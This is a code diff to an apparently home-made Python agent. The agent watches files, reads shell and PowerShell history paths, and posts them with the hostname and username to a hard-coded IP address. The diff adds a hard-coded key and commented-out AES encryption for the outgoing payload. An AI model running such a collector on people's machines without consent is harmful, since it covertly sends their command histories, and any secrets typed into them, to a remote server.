@@ -8,6 +8,11 @@ import os
 import time
 import socket
 import getpass
+import base64
+import json
+# from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+# from cryptography.hazmat.primitives import padding
+# from cryptography.hazmat.backends import default_backend
 # import difflib
 # add 
 # certin powershell history settings 
@@ -15,6 +20,10 @@ import getpass
 URL = "http://100.95.68.26:5000"
 hostname = socket.gethostname()
 username = getpass.getuser()
+# PSK = "0feNcM1h9Cx2mWAopX6Rq8WZ9sHUvQG4TthfgCL2lk0="
+
+
+
 class FileChecking(FileSystemEventHandler):
     def __init__(self):
         # print("init")
@@ -125,14 +134,37 @@ def get_history_paths(is_dir=False):
 
 def post_log(endpoint, payload):
     try:
+        # encrypted_string = encrypt_payload(payload)#will need to format the object
+        # encrypted_payload = {"d":encrypted_string}
         r = requests.post(f"{URL}/{endpoint}", json=payload, timeout=5)
-        
+        # r = requests.post(f"{URL}/{endpoint}", json=encrypted_payload, timeout=5)
+
+        # r= requests.post(f"{URL}/{endpoint}", json=encrypt_payload(payload), timeout=5)
         # print(response)
 
         # r = requests.post(f"{URL}", json=payload, timeout=5)
-        return r.json()
-    except Exception:
-        return {}
+        return r.text
+    except Exception as e:
+        print(f"Error: {e}")
+
+# def _get_key() -> bytes:
+#     return base64.b64decode(PSK)
+
+# def encrypt_payload(data: dict) -> str:
+
+#     plaintext = json.dumps(data).encode("utf-8")
+
+#     # PKCS7 padding
+#     padder = padding.PKCS7(128).padder()
+#     padded = padder.update(plaintext) + padder.finalize()
+
+#     iv = os.urandom(16)
+#     cipher = Cipher(algorithms.AES(_get_key()), modes.CBC(iv), backend=default_backend())
+#     encryptor = cipher.encryptor()
+#     ciphertext = encryptor.update(padded) + encryptor.finalize()
+
+#     return base64.b64encode(iv + ciphertext).decode("ascii")
+
 def main():
     # print(get_history_paths())
     print(hostname)
